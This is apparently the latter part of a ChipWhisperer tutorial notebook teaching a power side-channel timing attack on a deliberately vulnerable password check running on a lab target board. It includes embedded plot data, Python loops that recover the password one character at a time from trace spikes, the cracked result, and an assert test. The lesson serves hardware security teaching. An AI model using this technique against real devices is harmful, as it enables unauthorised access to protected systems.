Q/AAAAAAAAqL8AAAAAAICxPwAAAAAAgLq/AAAAAAAAlD8AAAAAAAChvwAAAAAAQLU/AAAAAAAAsL8AAAAAAACoPwAAAAAAAJm/AAAAAADAtD8AAAAAAAC/vwAAAAAAAHA/AAAAAAAAqr8AAAAAAECwPwAAAAAAALO/AAAAAAAAqD8AAAAAAACEvwAAAAAAQLg/AAAAAACAxL8AAAAAAACZvwAAAAAAAK+/AAAAAACAsD8AAAAAAMC3vwAAAAAAAJs/AAAAAAAApb8AAAAAAICyPwAAAAAAoMi/AAAAAACAq78AAAAAAAC3vwAAAAAAgKM/AAAAAABgx78AAAAAAICsvwAAAAAAQLm/AAAAAAAAmj8AAAAAAGDKvwAAAAAAAK2/AAAAAACAtr8AAAAAAACnPwAAAAAAoNC/AAAAAABAvb8AAAAAAIDCvwAAAAAAAIS/AAAAAACgyL8AAAAAAICovwAAAAAAQLW/AAAAAAAApj8AAAAAAADHvwAAAAAAgKK/AAAAAADAsb8AAAAAAACvPwAAAAAAQLe/AAAAAACAoz8AAAAAAACMvwAAAAAAgLg/AAAAAABAsr8AAAAAAACtPwAAAAAAAHw/AAAAAABAvz8AAAAAAICsvwAAAAAAgKs/AAAAAAAAlL8AAAAAAMC2PwAAAAAAwMO/AAAAAAAAmL8AAAAAAICxvwAAAAAAAKs/AAAAAADAuL8AAAAAAACTPwAAAAAAgKS/AAAAAADAsj8AAAAAAEC4vwAAAAAAAJ8/AAAAAAAAmL8AAAAAAEC3PwAAAAAAALG/AAAAAACApj8AAAAAAACbvwAAAAAAwLQ/AAAAAABAvb8AAAAAAAB8PwAAAAAAgKi/AAAAAABAsD8AAAAAAACyvwAAAAAAAKk/AAAAAAAAgr8AAAAAAEC6PwAAAAAA4MO/AAAAAAAAlL8AAAAAAICtvwAAAAAAQLA/AAAAAACAvL8AAAAAAACIPwAAAAAAAKi/AAAAAADAsT8AAAAAAADJvwAAAAAAgKy/AAAAAABAuL8AAAAAAACiPwAAAAAAAMW/AAAAAACAob8AAAAAAIC1vwAAAAAAAKQ/AAAAAACgyb8AAAAAAACvvwAAAAAAgLa/AAAAAAAApj8AAAAAAGDRvwAAAAAAAL+/AAAAAABgw78AAAAAAACIvwAAAAAAQMm/AAAAAAAAqr8AAAAAAAC2vwAAAAAAgKY/AAAAAAAgxr8AAAAAAACevwAAAAAAALC/AAAAAACArT8AAAAAAEC2vwAAAAAAgKU/AAAAAAAAgL8AAAAAAMC6PwAAAAAAwLK/AAAAAACArD8AAAAAAABwPwAAAAAAgL0/AAAAAAAAr78AAAAAAACrPwAAAAAAAJC/AAAAAADAtz8AAAAAACDCvwAAAAAAAIy/AAAAAADAsL8AAAAAAACtPwAAAAAAQLi/AAAAAAAAmz8AAAAAAICgvwAAAAAAQLQ/AAAAAACAub8AAAAAAACWPwAAAAAAAKC/AAAAAACAtT8AAAAAAACyvwAAAAAAgKU/AAAAAAAAnL8AAAAAAIC0PwAAAAAAAL+/AAAAAAAAdD8AAAAAAICqvw==","dtype":"float64","shape":[2000]}},"selected":{"id":"1163","type":"Selection"},"selection_policy":{"id":"1164","type":"UnionRenderers"}},"id":"1141","type":"ColumnDataSource"},{"attributes":{"data_source":{"id":"1136","type":"ColumnDataSource"},"glyph":{"id":"1137","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1138","type":"Line"},"selection_glyph":null,"view":{"id":"1140","type":"CDSView"}},"id":"1139","type":"GlyphRenderer"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1138","type":"Line"},{"attributes":{},"id":"1126","type":"HelpTool"},{"attributes":{"data_source":{"id":"1141","type":"ColumnDataSource"},"glyph":{"id":"1142","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1143","type":"Line"},"selection_glyph":null,"view":{"id":"1145","type":"CDSView"}},"id":"1144","type":"GlyphRenderer"},{"attributes":{"text":""},"id":"1155","type":"Title"}],"root_ids":["1102"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"a34389af-bc31-419c-8673-2310d656ca15","roots":{"1102":"f0ea7b62-80df-4384-898c-7a444b60ce29"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We'll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.21 at 217 in red
and 253 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 217, 253,
-0.21, and 36).

Attacking a Single Letter
-------------------------

Now that we've located a distinctive timing difference, we can start
building our attack. We'll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we'll create a loop that:

-  Figures out our next guess
-  Does the capture and records the trace
-  Checks if sample 217 is larger than -0.2 (replace with appropriate
   values)

To make things a little easier for later, we'll make a function that
will return whether our spike is (guess incorrect) or isn't (guess
correct) in the right location:


**In [15]:**

.. code:: ipython3

    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] > -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[121 + 72 * i] > -0.3

The below loop finds the first correct character, prints it, then ends.
You should see "Success: h" after a while.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if checkpass(trace, 0):
            print("Success: " + c)
            break


**Out [16]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success: h
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [17]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [17]:**



.. parsed-literal::

    Success, pass now h
    Success, pass now h0
    Success, pass now h0p
    Success, pass now h0px
    Success, pass now h0px3
    


That's it! You should have successfully cracked a password using the
timing attack. Some notes on this method:

-  The target device has a finite start-up time, which slows down the
   attack. If you wish, remove some of the ``printf()``'s from the
   target code, recompile and reprogram, and see how quickly you can do
   this attack.
-  The current script doesn't look for the "WELCOME" message when the
   password is OK. That is an extension that allows it to crack any size
   password.
-  If there was a lock-out on a wrong password, the system would ignore
   it, as it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [18]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [19]:**

.. code:: ipython3

    assert (password == "h0px3"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)


**In [ ]:**

